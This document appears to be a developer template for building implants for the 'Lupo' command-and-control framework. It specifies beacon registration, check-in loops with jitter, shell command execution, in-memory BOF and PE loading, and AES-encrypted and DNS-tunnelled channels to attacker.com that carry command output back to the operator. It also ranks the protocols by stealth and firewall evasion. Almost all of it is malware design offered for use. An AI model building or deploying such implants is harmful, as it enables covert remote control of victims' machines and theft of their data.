# Lupo Implant Generation Template

## Overview

This template provides comprehensive guidance for implementing Lupo implants across multiple protocols (TCP, DNS, HTTP, HTTPS). It covers:
- Core implant architecture (common to all protocols)
- Protocol-specific implementation details
- Message encoding/decoding specifications
- Error handling and edge cases
- Common implementation mistakes to avoid

## Critical Lessons Learned

The following lessons apply to **ALL** protocols:

### 1. JSON Escaping (Critical!)

When embedding multi-line command output in JSON, MUST escape in this exact order:

```
Escape Order (IMPORTANT - backslashes FIRST):
1. Backslashes: \ → \\
2. Quotes: " → \"
3. Newlines: actual newline → \n (literal backslash-n)
4. Carriage returns: actual CR → \r
5. Tabs: actual tab → \t
```

**Symptom of failure**: `invalid character '\n' in string literal`

Example with `ip addr` output:
```
Raw output:
1: lo: <LOOPBACK,UP,LOWER_UP>
    inet 127.0.0.1

JSON-escaped:
{"data":"1: lo: <LOOPBACK,UP,LOWER_UP>\n    inet 127.0.0.1"}
```

### 2. In-Memory Session State (Critical!)

SessionID and UUID **must be stored as global in-memory variables**, not written to disk. If the implant process dies, the session credentials die with it, and the implant re-registers on the next execution. This is the correct default behaviour — the operator controls persistence at the C2 level, not the implant level.

**Pattern (any language):**
- Declare `sessionID` and `uuid` as global/module-level variables initialised to zero values
- After successful registration, assign the server-returned values directly into those globals
- All subsequent check-ins read from those globals — no file I/O required

**If the developer explicitly wants optional disk persistence** (e.g. surviving reboots), see Mistake 1 for the trailing-newline pitfall that causes `invalid UUID length: 0` and SessionID=0.

### 3. Protocol-Specific Message Encoding

| Protocol | Request Format | Response Format | Field Names |
|----------|------------------|-------------------|-------------|
| TCP | JSON + `\n` newline | Plain JSON (no `\n`) | Capitalized: `PSK`, `SessionID`, `UUID` |
| HTTP/HTTPS | URL-encoded params | JSON object | Lowercase params: `psk`, `sessionID`, `UUID` |
| DNS | Base64 in subdomain | Base64 in TXT record | Lowercase in JSON: `psk`, `sessionID`, `UUID` |

### 4. Command Response Format (All Protocols)

Server response is ALWAYS:
```json
{"cmd":"command_here","user":"username"}
```

- `cmd` is **plain text** (not base64, not encoded)
- If `cmd` is empty string, no command to execute
- Client executes command and captures output (including newlines)
- **Next check-in**, send output in Data/data field with proper JSON escaping

---

## Part 1: Core Implant Architecture (All Protocols)

### 1.1 Implant State Management

```
IMPLANT STATE (in-memory, global variables — never written to disk by default):
├── SessionID: Unique session identifier from server
├── UUID: Unique implant identifier from server
├── PSK: Pre-Shared Key for authentication (embedded at build time)
├── Registered: Boolean flag indicating registration status
├── LastCheckIn: Timestamp of last successful check-in
└── PendingOutput: Output from last command execution

IMPLANT CONFIGURATION (set at startup):
├── C2_SERVER: IP or hostname of C2 server
├── C2_PORT: Port number of C2 listener
├── BEACON_INTERVAL: Seconds between check-ins (with jitter)
├── PSK: Pre-Shared Key (must match server PSK)
├── IMPLANT_ARCH: Architecture string (OS + arch, e.g., "Linux-x86_64")
└── UPDATE_INTERVAL: Update interval to report to server
```

### 1.2 Registration Flow

```
REGISTRATION SEQUENCE (All Protocols):

1. Client sends registration request:
   - SessionID = 0 (not yet registered)
   - UUID = "" (empty)
   - Register = true
   - PSK = configured PSK

2. Server validates PSK

3. If valid, server responds with:
   - sessionID = new integer (e.g., 774)
   - UUID = new UUID string (e.g., "2080fae2-9d66-4a7d-ae1a-d9af45cf87fa")

4. Client stores credentials in global in-memory variables
   - Assign server-returned sessionID and UUID directly to global variables
   - Use for all subsequent check-ins (no disk writes by default)

5. Client enters check-in loop using stored SessionID and UUID
```

### 1.3 Check-in Loop

```
CONTINUOUS CHECK-IN LOOP:

LOOP FOREVER:
    1. Sleep for BEACON_INTERVAL seconds (add random jitter 0-50%)
    
    2. Read SessionID and UUID from global in-memory variables
    
    3. Build check-in message:
       {
           "psk": PSK,
           "sessionID": SessionID,
           "UUID": UUID,
           "data": OUTPUT_FROM_LAST_COMMAND,  // JSON-escaped!
           "arch": IMPLANT_ARCH,
           "update": UPDATE_INTERVAL
       }
    
    4. Send to server via protocol (TCP/HTTP/HTTPS/DNS)
    
    5. Parse response: {"cmd":"...","user":"..."}
    
    6. If cmd is empty or null:
       - Do nothing
       - Continue loop
    
    7. If cmd is not empty:
       - Execute command
       - Capture output (all lines, all special chars)
       - Store output for next check-in (JSON-escaped)
       - Continue loop
    
    8. Send output on next check-in in "data" field
```

### 1.4 Command Execution

Server commands arrive as plain text strings. The first whitespace-delimited token is the command name; the remaining tokens are its arguments (`argS`).

```
FUNCTION ExecuteCommand(command_string):
    // Split into command + argument tokens
    parts = SPLIT(command_string, " ")
    cmd   = parts[0]
    argS  = parts[1:]  // may be empty

    SWITCH cmd:
        CASE "shell":
            // Execute shell command with arguments
            args = JOIN(argS, " ")
            output = EXECUTE_SHELL(args)
            RETURN output

        CASE "ping":
            RETURN "pong"

        CASE "exit":
            CLEANUP()
            EXIT_PROCESS()

        CASE "bof_loader":
            // Synchronous COFF/BOF execution
            // Wire format: "bof_loader [arg_tokens...] <base64-coff>"
            //   argS[LAST]   = base64-encoded COFF binary (always the last token)
            //   argS[0:LAST] = type-prefixed BOF argument tokens (empty when
            //                  the operator did not pass -a arguments)
            IF LENGTH(argS) < 1:
                RETURN "Error: bof_loader requires a COFF binary"

            base64_coff = argS[LAST]
            arg_tokens  = argS[0:LAST]

            coff_bytes  = BASE64_DECODE(base64_coff)
            beacon_args = PACK_BOF_ARGS(arg_tokens)  // see 1.4.1

            RETURN EXECUTE_BOF_SYNC(coff_bytes, beacon_args)

        CASE "bof_loader_async":
            // Asynchronous COFF/BOF execution — identical wire format to bof_loader
            // Dispatch to a background thread/goroutine; return immediately.
            // The implant MUST queue the result in global_async_results and flush
            // it to the C2 at the start of the next check-in cycle (see 1.4.2).
            IF LENGTH(argS) < 1:
                RETURN "Error: bof_loader_async requires a COFF binary"

            base64_coff = argS[LAST]
            arg_tokens  = argS[0:LAST]

            coff_bytes  = BASE64_DECODE(base64_coff)
            beacon_args = PACK_BOF_ARGS(arg_tokens)

            job_id = ATOMIC_INCREMENT(global_async_job_counter)

            SPAWN_BACKGROUND:
                result = EXECUTE_BOF_SYNC(coff_bytes, beacon_args)
                LOCK(global_async_results_mutex)
                APPEND global_async_results, {id: job_id, output: result}
                UNLOCK(global_async_results_mutex)

            RETURN "BOF async job " + str(job_id) + " started"

        CASE "pe_loader":
            // Reflective in-memory PE execution
            // Wire format: "pe_loader [arg_tokens...] <base64-pe>"
            //   argS[LAST]   = base64-encoded PE binary (always the last token)
            //   argS[0:LAST] = command-line arguments passed to the PE (may be empty)
            IF LENGTH(argS) < 1:
                RETURN "Error: pe_loader requires a PE binary"

            base64_pe = argS[LAST]
            pe_args   = argS[0:LAST]

            pe_bytes = BASE64_DECODE(base64_pe)
            RETURN EXECUTE_PE_IN_MEMORY(pe_bytes, pe_args)

        DEFAULT:
            // Plain shell commands (no prefix)
            output = EXECUTE_SHELL(JOIN(parts, " "))
            RETURN output
```

### 1.4.1 BOF Argument Packing

BOF argument tokens are type-prefixed strings passed via the `-a` flag when the operator invokes `bof_loader` or `bof_loader_async`. The packing function converts them into a binary beacon-args buffer expected by the COFF runtime. If no prefix is given the token defaults to `wstring` (UTF-16LE), which matches Cobalt Strike BOF convention.

| Prefix | Type | Encoding |
|--------|------|----------|
| `wstring:` | Wide string (default) | UTF-16LE, length-prefixed |
| `string:` | ASCII/ANSI string | null-terminated + length-prefixed |
| `int:` | 32-bit integer | Little-endian uint32 |
| `short:` | 16-bit integer | Little-endian uint16 |

```
FUNCTION PACK_BOF_ARGS(arg_tokens):
    buffer = NEW BeaconArgsBuffer()

    FOR EACH token IN arg_tokens:
        IF token == "":
            CONTINUE

        IF STARTS_WITH(token, "wstring:"):
            buffer.AddWideString(SUBSTRING(token, 8))   // UTF-16LE
        ELSE IF STARTS_WITH(token, "string:"):
            buffer.AddString(SUBSTRING(token, 7))        // ASCII
        ELSE IF STARTS_WITH(token, "int:"):
            buffer.AddInt32(PARSE_INT(SUBSTRING(token, 4)))
        ELSE IF STARTS_WITH(token, "short:"):
            buffer.AddInt16(PARSE_INT(SUBSTRING(token, 6)))
        ELSE:
            // No prefix — default to wide string (UTF-16LE)
            buffer.AddWideString(token)

    RETURN buffer.GetBytes()
```

### 1.4.2 Async BOF Result Queue

When `bof_loader_async` is dispatched, the goroutine/thread appends its result to a global in-memory queue. At the **start of every check-in cycle**, before processing the incoming command, the implant must drain the queue and send each pending result back to the C2.

```
// Global state (initialised at startup)
global_async_results      = []   // List of {id: int, output: string}
global_async_results_mutex       // Mutex protecting the list
global_async_job_counter  = 0   // Monotonically incrementing job ID

// Called at the START of each check-in, BEFORE processing the incoming cmd:
FUNCTION FlushAsyncResults(c2_connection):
    LOCK(global_async_results_mutex)
    pending               = COPY(global_async_results)
    global_async_results  = []
    UNLOCK(global_async_results_mutex)

    FOR EACH result IN pending:
        output = "[Async BOF Job " + str(result.id) + "]\n" + result.output
        SEND_DATA_TO_C2(c2_connection, output)
```

---

## Part 2: TCP Protocol (Raw Socket-Based)

### 2.1 TCP Protocol Overview

- **Mechanism**: Raw TCP sockets using line-delimited JSON
- **Format**: JSON messages terminated with `\n` (newline)
- **Advantages**: Fastest, most flexible, binary safe
- **Disadvantages**: Requires JSON escaping for multi-line output, custom protocol parsing

### 2.2 TCP Message Format

**CRITICAL: Client sends WITH newline `\n`, server responds WITHOUT**

#### Registration Request (Client → Server)
```json
{"PSK":"wolfpack","SessionID":0,"UUID":"","ImplantArch":"Linux","Update":10.0,"Register":true}
\n
```

#### Check-in Request (Client → Server)
```json
{"PSK":"wolfpack","SessionID":774,"UUID":"2080fae2-9d66-4a7d-ae1a-d9af45cf87fa","Data":"cerdmann","ImplantArch":"Linux","Update":10.0,"Register":false}
\n
```

#### Registration Response (Server → Client)
```json
{"sessionID":774,"UUID":"2080fae2-9d66-4a7d-ae1a-d9af45cf87fa"}
```
(NO trailing newline)

#### Check-in Response (Server → Client)
```json
{"cmd":"whoami","user":"server"}
```
(NO trailing newline)

### 2.2.1 Critical TCP Requirements

**Field Names are CASE-SENSITIVE (capitalized):**
- Client sends: `PSK`, `SessionID`, `UUID`, `ImplantArch`, `Data`, `Update`, `Register`
- Server sends: `sessionID`, `UUID`, `cmd`, `user`

**Newline handling:**
- Client MUST send JSON with trailing `\n` (server's `ReadString('\n')` depends on it)
- Server sends response WITHOUT newline
- Client should use timeout-based reading for responses (not line-based)

**Multi-line output escaping:**
```json
{"PSK":"...","SessionID":774,"UUID":"...","Data":"line1\nline2\nline3","Register":false}
```

**Output handling:**
- Command output goes in `Data` field as plain text with `\n` for newlines
- NOT base64 encoded
- NOT wrapped with `shell_result:` prefix

### 2.3 TCP Client Implementation Template

```
FUNCTION SendToC2_TCP(implant, message):
    // JSON-escape the message (handle \n, \", \\)
    escaped_message = JSON_ESCAPE(message)
    
    // Build JSON payload
    IF implant.registered == FALSE:
        payload = {
            "PSK": implant.psk,
            "SessionID": 0,
            "UUID": "",
            "ImplantArch": implant.arch,
            "Update": implant.update_interval,
            "Register": true
        }
    ELSE:
        payload = {
            "PSK": implant.psk,
            "SessionID": implant.session_id,
            "UUID": implant.uuid,
            "Data": escaped_message,
            "ImplantArch": implant.arch,
            "Update": implant.update_interval,
            "Register": false
        }
    END IF
    
    // Convert to JSON string
    json_string = JSON_STRINGIFY(payload)
    
    // Create TCP socket
    socket = NEW TcpSocket()
    socket.Timeout = 3 seconds
    
    // Connect to server
    IF NOT socket.Connect(implant.c2_server, implant.c2_port):
        log("Failed to connect to TCP server")
        RETURN ""
    
    // CRITICAL: Send with newline terminator
    socket.Send(json_string + "\n")
    
    // Read response (NO newline expected)
    response = socket.ReadUntilTimeout(1MB)
    socket.Close()
    
    RETURN response

FUNCTION JSON_ESCAPE(str):
    // Order matters: escape backslashes FIRST
    str = str.Replace("\\", "\\\\")
    str = str.Replace("\"", "\\\"")
    str = str.Replace("\n", "\\n")
    str = str.Replace("\r", "\\r")
    str = str.Replace("\t", "\\t")
    RETURN str

FUNCTION ParseTCPResponse(response):
    // Response format: {"sessionID":774,"UUID":"...","cmd":"...","user":"..."}
    parsed = JSON_PARSE(response)
    
    // If registration response, extract credentials
    IF "sessionID" IN parsed AND "UUID" IN parsed:
        session_id = parsed["sessionID"]
        uuid = parsed["UUID"]
        
        // Validate and store in global in-memory variables
        IF session_id > 0 AND uuid != "":
            implant.session_id = session_id
            implant.uuid       = uuid
            implant.registered = TRUE
            RETURN {session_id, uuid}
    
    // If check-in response, extract command
    IF "cmd" IN parsed:
        cmd = parsed["cmd"]
        IF cmd == "" OR cmd == NULL:
            RETURN NULL
        RETURN cmd
    
    RETURN NULL
```

---

### 2.4 TCP Encrypted Mode (AES-256-GCM)

When the operator starts a TCP listener with the `-e` flag (e.g. `listener start -x TCP -e <key>`), all traffic between the implant and server is encrypted with AES-256-GCM. The following lessons were learned the hard way and **must** be followed exactly.

#### 2.4.1 Key Requirements

- AES requires the key to be **exactly 16, 24, or 32 bytes** (AES-128/192/256).
- The server passes the raw `-e` string directly as the AES key — **no hashing, no padding**.
- Choose a key whose byte length is exactly one of those three values. A 32-byte key (AES-256) is recommended.
- Example of a valid 32-byte key: `mie0weiBahxeiri3sahxaKoolohnex1d`
- **Do NOT attempt to use a short mnemonic like `tcpshared` as-is** — it is 9 bytes and `aes.NewCipher` will return an error.

#### 2.4.2 The Binary-in-Newline Problem (Critical!)

The server receives implant data with `bufio.ReadString('\n')`. AES-GCM ciphertext is arbitrary binary and **will statistically contain `0x0A` (`\n`) bytes**, causing the server to truncate the payload mid-ciphertext.

**Fix — Base64 encode the ciphertext before sending:**
```
// Outbound (implant → server):
ciphertext = AES_GCM_ENCRYPT(json_payload, key)
b64        = BASE64_ENCODE(ciphertext)       // eliminates all 0x0A bytes
socket.Send(b64 + "\n")                      // newline is safe now — no binary

// Inbound (server → implant):
// Server must also BASE64_ENCODE its encrypted responses for the same reason.
// Implant reads until EOF/timeout, then BASE64_DECODE, then AES_GCM_DECRYPT.
```

Both directions must use base64 wrapping. If only one direction is wrapped, the channel is broken.

#### 2.4.3 Server Sends Encrypted on ALL Paths (Not Just Check-in)

A common mistake is only encrypting the normal check-in response at the end of the handler. The Lupo TCP server has **four separate write points**:

| Path | Description |
|------|-------------|
| Registration | New implant registers for the first time |
| Persistence reconnect #1 | Session missing from store, PersistenceMode=true |
| Persistence reconnect #2 | UUID mismatch on existing session, PersistenceMode=true |
| Normal check-in | Every subsequent check-in after registration |

**All four must encrypt and base64-encode** when `cryptoPSK != ""`. If any one of them sends plain JSON while the implant expects encrypted data, decryption will fail and the implant will get stuck in a re-registration loop.

The correct pattern is a shared helper used at every write site:
```
FUNCTION WriteTCPResponse(conn, json_bytes, cryptoPSK):
    IF cryptoPSK != "":
        ciphertext = AES_GCM_ENCRYPT(json_bytes, cryptoPSK)
        conn.Write(BASE64_ENCODE(ciphertext))   // no newline on responses
    ELSE:
        conn.Write(json_bytes)                  // plain TCP mode unchanged
```

#### 2.4.4 Reading Encrypted Responses on the Implant

Plain TCP responses are framed by brace-counting (`{`/`}` depth). Encrypted responses are NOT JSON — they are base64 strings. **Do not use brace-counting for encrypted responses.**

```
IF cryptoPSK != "":
    // Server closes the connection after writing — ReadAll gives complete payload
    raw = READ_UNTIL_EOF_OR_TIMEOUT(conn)
    IF raw is empty: RETURN ""
    ciphertext = BASE64_DECODE(TRIM(raw))
    plaintext  = AES_GCM_DECRYPT(ciphertext, key)
    RETURN plaintext                            // this is the JSON string

ELSE:
    // Plain mode: brace-count to find end of JSON object
    USE_BRACE_COUNTING_READER(conn)
```

#### 2.4.5 Symptom → Root Cause Map

| Observed symptom | Root cause |
|------------------|-----------|
| `cipher: message authentication failed` | Raw binary ciphertext sent without base64; `0x0A` byte truncated the payload so GCM tag is corrupt |
| `unexpected end of JSON input` + `TCP Request did not provide PSK` | Same truncation — server received a partial ciphertext, decrypted garbage, JSON parse failed |
| Implant registers successfully but keeps re-registering on every check-in | Server returns plain JSON for the registration response but encrypted JSON for check-in (or vice versa); implant fails to decrypt/parse one side |
| `aes.NewCipher: invalid key size N` | PSK is not 16, 24, or 32 bytes |

#### 2.4.6 Encrypted TCP Implementation Template

```
CONSTANT CRYPTO_PSK = "mie0weiBahxeiri3sahxaKoolohnex1d"  // 32 bytes

FUNCTION SendToC2_TCP_Encrypted(implant, message):
    json_string = JSON_STRINGIFY(BuildCheckInPayload(implant, message))

    IF CRYPTO_PSK != "":
        ciphertext = AES_GCM_ENCRYPT(json_string, CRYPTO_PSK)
        payload    = BASE64_ENCODE(ciphertext) + "\n"
    ELSE:
        payload = json_string + "\n"

    conn = TCP_CONNECT(implant.c2_server, implant.c2_port, timeout=5s)
    conn.Write(payload)

    IF CRYPTO_PSK != "":
        raw        = conn.ReadAll()             // server closes after writing
        ciphertext = BASE64_DECODE(TRIM(raw))
        RETURN AES_GCM_DECRYPT(ciphertext, CRYPTO_PSK)
    ELSE:
        RETURN BRACE_COUNT_READ(conn)           // plain JSON object

FUNCTION AES_GCM_ENCRYPT(plaintext, key):
    block = AES_NEW_CIPHER(key)                 // key MUST be 16/24/32 bytes
    gcm   = GCM_NEW(block)
    nonce = RANDOM_BYTES(gcm.NonceSize())       // typically 12 bytes
    // Seal prepends nonce: output = nonce || ciphertext || tag
    RETURN gcm.Seal(nonce, nonce, plaintext, nil)

FUNCTION AES_GCM_DECRYPT(ciphertext, key):
    block     = AES_NEW_CIPHER(key)
    gcm       = GCM_NEW(block)
    nonceSize = gcm.NonceSize()
    nonce     = ciphertext[0 : nonceSize]
    data      = ciphertext[nonceSize :]
    RETURN gcm.Open(nil, nonce, data, nil)
```

---

## Part 3: HTTP Protocol (Stateless, Poll-Based)

### 3.1 HTTP Protocol Overview

- **Mechanism**: Standard HTTP GET/POST requests with URL parameters
- **Format**: URL-encoded parameters, JSON responses
- **Advantages**: Works everywhere, through proxies, fast
- **Disadvantages**: More visible in logs, multi-line output requires URL encoding

### 3.2 HTTP Message Format

**Parameter names are lowercase and case-sensitive**

#### Registration Request (GET)
```
GET /?psk=wolfpack&register=true&arch=Linux&update=10 HTTP/1.1
Host: attacker.com:80
```

#### Registration Request (POST)
```
POST / HTTP/1.1
Host: attacker.com:80
Content-Type: application/x-www-form-urlencoded

psk=wolfpack&register=true&arch=Linux&update=10
```

#### Registration Response (JSON)
```json
{"sessionID":774,"UUID":"2080fae2-9d66-4a7d-ae1a-d9af45cf87fa"}
```

#### Check-in Request (GET)
```
GET /?psk=wolfpack&sessionID=774&UUID=2080fae2-9d66-4a7d-ae1a-d9af45cf87fa&data=cerdmann&arch=Linux&update=10 HTTP/1.1
Host: attacker.com:80
```

#### Check-in Request (POST)
```
POST / HTTP/1.1
Host: attacker.com:80
Content-Type: application/x-www-form-urlencoded

psk=wolfpack&sessionID=774&UUID=2080fae2-9d66-4a7d-ae1a-d9af45cf87fa&data=cerdmann&arch=Linux&update=10
```

#### Check-in Response (JSON)
```json
{"cmd":"whoami","user":"server"}
```

### 3.2.1 Critical HTTP Requirements

**Parameter names (lowercase, case-sensitive):**
- `psk`, `sessionID`, `UUID`, `data`, `arch`, `update`, `register`

**Multi-line output MUST be URL-encoded:**
- Newlines: `%0A`
- Spaces: `%20` or `+`
- Quotes: `%22`
- Backslashes: `%5C`
- Other special chars: percent-encoded

**Response is JSON:**
- Always: `{"cmd":"...","user":"..."}`
- NOT the old BEACON format
- Command is plain text (not base64)

### 3.3 HTTP Client Implementation Template

```
FUNCTION SendToC2_HTTP(implant, message):
    // URL-encode the message
    encoded_message = URL_ENCODE(message)
    
    // Build URL with query parameters
    url = FORMAT("http://%s:%d/?psk=%s&sessionID=%d&UUID=%s&data=%s&arch=%s&update=%d&register=false",
                 implant.c2_server, implant.c2_port, implant.psk,
                 implant.session_id, implant.uuid, encoded_message,
                 implant.arch, implant.update_interval)
    
    // Create HTTP client
    client = NEW HttpClient()
    client.Timeout = 10 seconds
    
    // Send GET request
    response = client.Get(url)
    
    // Check response status
    IF response.StatusCode != 200:
        RETURN ""
    
    // Parse JSON response
    parsed = JSON_PARSE(response.Body)
    cmd = parsed.get("cmd", "")
    
    RETURN cmd

FUNCTION SendToC2_HTTP_REGISTRATION(implant):
    // Build registration URL
    url = FORMAT("http://%s:%d/?psk=%s&register=true&arch=%s&update=%d",
                 implant.c2_server, implant.c2_port, implant.psk,
                 implant.arch, implant.update_interval)
    
    // Send GET request
    client = NEW HttpClient()
    client.Timeout = 10 seconds
    
    response = client.Get(url)
    
    IF response.StatusCode != 200:
        RETURN FALSE
    
    // Parse response
    parsed = JSON_PARSE(response.Body)
    
    // Store credentials in global in-memory variables (no disk writes)
    session_id = parsed["sessionID"]
    uuid = parsed["UUID"]
    
    IF session_id > 0 AND uuid != "":
        implant.session_id = session_id
        implant.uuid       = uuid
        implant.registered = TRUE
        RETURN TRUE
    
    RETURN FALSE

FUNCTION URL_ENCODE(str):
    // Percent-encode special characters
    result = ""
    FOR EACH char IN str:
        IF char IN [A-Z, a-z, 0-9, "-", "_", ".", "~"]:
            result += char
        ELSE IF char == " ":
            result += "+"
        ELSE:
            // Convert to hex: %XX
            result += "%" + HEX(BYTE_VALUE(char))
    
    RETURN result
```

---

## Part 4: HTTPS Protocol (Encrypted HTTP)

### 4.1 HTTPS Protocol Overview

- **Mechanism**: Identical to HTTP but with TLS encryption
- **Format**: Same URL parameters as HTTP, over encrypted channel
- **Advantages**: Encrypted, professional appearance, through corporate proxies
- **Disadvantages**: Requires SSL certificate or pinning, slower than HTTP

### 4.2 HTTPS Message Format

**Identical to HTTP** (see Part 3), but:
- Use `https://` instead of `http://`
- All parameters same (lowercase, case-sensitive)
- All encoding same (URL-encoded)
- Response is JSON (same format as HTTP)

#### Example (HTTPS GET)
```
GET /api/beacon?psk=wolfpack&sessionID=774&UUID=2080...&data=cerdmann&arch=Linux&update=10 HTTPS/1.1
Host: attacker.com:443
(sent via TLS tunnel)
```

### 4.3 HTTPS Client Implementation Template

```
FUNCTION SendToC2_HTTPS(implant, message):
    // Same as HTTP, but use https:// and handle TLS
    encoded_message = URL_ENCODE(message)
    
    // Build HTTPS URL
    url = FORMAT("https://%s:%d/?psk=%s&sessionID=%d&UUID=%s&data=%s&arch=%s&update=%d&register=false",
                 implant.c2_server, implant.c2_port, implant.psk,
                 implant.session_id, implant.uuid, encoded_message,
                 implant.arch, implant.update_interval)
    
    // Create HTTPS client with certificate handling
    client = NEW HttpsClient()
    client.Timeout = 10 seconds
    
    // OPTION 1: Accept any certificate (easiest for testing/self-signed)
    client.IgnoreCertificateErrors = TRUE
    
    // OPTION 2: Pin specific certificate (more secure)
    // client.SetPinnedCertPublicKey(implant.pinned_cert_key)
    
    // OPTION 3: Use system certificate store (most compatible)
    // client.UseSystemCertificateStore()
    
    // Send HTTPS GET request
    response = client.Get(url)
    
    // Check response status
    IF response.StatusCode != 200:
        RETURN ""
    
    // Parse JSON response (same as HTTP)
    parsed = JSON_PARSE(response.Body)
    cmd = parsed.get("cmd", "")
    
    RETURN cmd

FUNCTION SendToC2_HTTPS_REGISTRATION(implant):
    // Same as HTTP but use https://
    url = FORMAT("https://%s:%d/?psk=%s&register=true&arch=%s&update=%d",
                 implant.c2_server, implant.c2_port, implant.psk,
                 implant.arch, implant.update_interval)
    
    client = NEW HttpsClient()
    client.Timeout = 10 seconds
    client.IgnoreCertificateErrors = TRUE  // Or use certificate pinning
    
    response = client.Get(url)
    
    IF response.StatusCode != 200:
        RETURN FALSE
    
    // Parse and store credentials in global in-memory variables (same as HTTP)
    parsed = JSON_PARSE(response.Body)
    
    session_id = parsed["sessionID"]
    uuid = parsed["UUID"]
    
    IF session_id > 0 AND uuid != "":
        implant.session_id = session_id
        implant.uuid       = uuid
        implant.registered = TRUE
        RETURN TRUE
    
    RETURN FALSE
```

---

## Part 5: DNS Protocol (Query-Based C2)

### 5.1 DNS Protocol Overview

- **Mechanism**: DNS TXT queries encode session info, responses in TXT records
- **Format**: Subdomain encodes data, responses base64 in TXT records
- **Advantages**: Stealthy, works through most firewalls, encodes in queries
- **Disadvantages**: Limited by 255-char TXT record size, slower, requires chunking

### 5.2 DNS Message Format

**CRITICAL: DNS uses chunked base64 encoding**

#### Registration Query (Client → Server)
```
Query: 0-0-0-[base64_json].attacker.com TXT

Where base64_json is base64-encoded:
{"psk":"wolfpack","sessionID":0,"UUID":"","ImplantArch":"Linux","Update":10.0,"Register":true}
```

#### Check-in Query (Client → Server)
```
Query: [sessionID]-[chunkIndex]-[totalChunks]-[base64_json].attacker.com TXT

Example (single chunk):
774-0-1-eyJwc2siOiJ3b2xmcGFjayIsInNlc3Npb25JRCI6Nzc0LCJVVUlEIjoiMjA4MGZhZTItOWQ2Ni00YTdkLWFlMWEtZDlhZjQ1Y2Y4N2ZhIiwiRGF0YSI6ImNlcmRtYW5uIiwiSW1wbGFudEFyY2giOiJMaW51eCIsIlVwZGF0ZSI6MTAuMH0=.attacker.com TXT

Example (multi-chunk):
774-0-2-eyJwc2siOiJ3b2xmcGFjayIsInNlc3Npb25JRCI6Nzc0LCJVVUlEIjoiMjA4MGZhZTItOWQ2Ni00YTdkLWFlMWEtZDlhZjQ1Y2Y4N2ZhIiwiRGF0YSI6Im11bHRpLWxpbmUgb3V0cHV0IHRoYXQgaXMgdmVyeSBsb25nIGFuZCByZXF1aXJlcyBjaHVua2luZy4gVGhpcyBpcyBjaHVuayAwIGFuZA==.attacker.com TXT
774-1-2-b3V0cHV0IGNvbnRpbnVlZCBpbiBjaHVuayAxIiwib3V0cHV0LWZpbmFsLXBhcnQuIiwiSW1wbGFudEFyY2giOiJMaW51eCIsIlVwZGF0ZSI6MTAuMH0=.attacker.com TXT
```

#### Registration Response (Server → Client)
```
TXT Response: 1-0-eyJzZXNzaW9uSUQiOjc3NCwiVVVJRCI6IjIwODBmYWUyLTlkNjYtNGE3ZC1hZTFhLWQ5YWY0NWNmODdmYSJ9

Decodes to: {"sessionID":774,"UUID":"2080fae2-9d66-4a7d-ae1a-d9af45cf87fa"}
```

#### Check-in Response (Server → Client)
```
TXT Response: 1-0-eyJjbWQiOiJ3aG9hbWkiLCJ1c2VyIjoic2VydmVyIn0=

Decodes to: {"cmd":"whoami","user":"server"}
```

#### Chunk Request (Client → Server for large responses)
```
Query: getchunk-[sessionID]-[chunkIndex].attacker.com TXT
Example: getchunk-774-1.attacker.com TXT
```

### 5.2.1 Critical DNS Requirements

**Subdomain format (when chunking):**
```
[sessionID]-[chunkIndex]-[totalChunks]-[base64_data].basedomain.com TXT
```

**Response format from server:**
```
[totalChunks]-[chunkIndex]-[base64_response]
```

**Important notes:**
- Each base64 chunk should be ~50 characters (fits DNS label size)
- Concatenate all chunks in order, then base64 decode
- Response also uses same chunk format

**Multi-line output in JSON MUST be JSON-escaped:**
```json
{"psk":"wolfpack","sessionID":774,"UUID":"...","Data":"line1\nline2\nline3"}
```

### 5.3 DNS Client Implementation Template

```
FUNCTION SendToC2_DNS(implant, message):
    // Build JSON message with JSON escaping
    msg_json = JSON_ENCODE({
        "psk": implant.psk,
        "sessionID": implant.session_id,
        "UUID": implant.uuid,
        "Data": JSON_ESCAPE(message),
        "ImplantArch": implant.arch,
        "Update": implant.update_interval,
        "Register": false
    })
    
    // Base64 encode
    b64_msg = BASE64_ENCODE(msg_json)
    
    // Chunk into 50-character segments
    chunk_size = 50
    chunks = []
    FOR i = 0 TO LENGTH(b64_msg) STEP chunk_size:
        end = MIN(i + chunk_size, LENGTH(b64_msg))
        chunk = b64_msg[i:end]
        APPEND chunk TO chunks
    
    total_chunks = LENGTH(chunks)
    
    // Send each chunk as DNS query
    responses = []
    FOR i = 0 TO total_chunks - 1:
        chunk = chunks[i]
        
        // Build subdomain: sessionID-chunkIndex-totalChunks-data
        subdomain = FORMAT("%d-%d-%d-%s",
                          implant.session_id, i, total_chunks, chunk)
        
        // Query: subdomain.basedomain.com TXT
        query_domain = FORMAT("%s.%s", subdomain, implant.dns_domain)
        
        // Send DNS query
        dns_client = NEW DnsClient()
        dns_client.Timeout = 5 seconds
        
        response = dns_client.QueryTXT(query_domain, implant.c2_server, implant.c2_port)
        
        APPEND response TO responses
        SLEEP(100 ms)  // Rate limit DNS queries
    
    // Assemble and parse response
    IF total_chunks > 1 AND responses:
        assembled = ASSEMBLE_DNS_RESPONSE(responses)
        RETURN assembled
    ELSE IF responses:
        RETURN responses[0]
    
    RETURN ""

FUNCTION ParseDnsResponse(response):
    // Response format: "totalChunks-chunkIndex-base64data"
    parts = SPLIT(response, "-", 3)
    
    IF LENGTH(parts) != 3:
        RETURN NULL
    
    total_chunks = PARSE_INT(parts[0])
    chunk_index = PARSE_INT(parts[1])
    b64_data = parts[2]
    
    // If single chunk, decode directly
    IF total_chunks == 1:
        decoded = BASE64_DECODE(b64_data)
        parsed = JSON_PARSE(decoded)
        RETURN parsed
    
    // If multiple chunks, return for reassembly
    RETURN ChunkedResponse {
        totalChunks: total_chunks,
        chunkIndex: chunk_index,
        chunkData: b64_data
    }

FUNCTION AssembleDnsResponse(chunk_responses):
    // Concatenate all base64 chunks in order
    full_b64 = ""
    FOR EACH chunk IN chunk_responses:
        parts = SPLIT(chunk, "-", 3)
        IF LENGTH(parts) == 3:
            full_b64 += parts[2]
    
    // Decode and parse
    decoded = BASE64_DECODE(full_b64)
    parsed = JSON_PARSE(decoded)
    
    RETURN parsed
```

---

## Part 6: Protocol Comparison & Selection Guide

| Feature | TCP | HTTP | HTTPS | DNS |
|---------|-----|------|-------|-----|
| Speed | Very Fast | Fast | Medium | Slow |
| Stealth | Low | Low | High | Very High |
| Firewall Friendly | Poor | Good | Good | Excellent |
| Message Size | Unlimited | ~2KB params | ~2KB params | 255 chars/TXT |
| Encoding | JSON + `\n` | URL-encoded | URL-encoded | Base64 chunked |
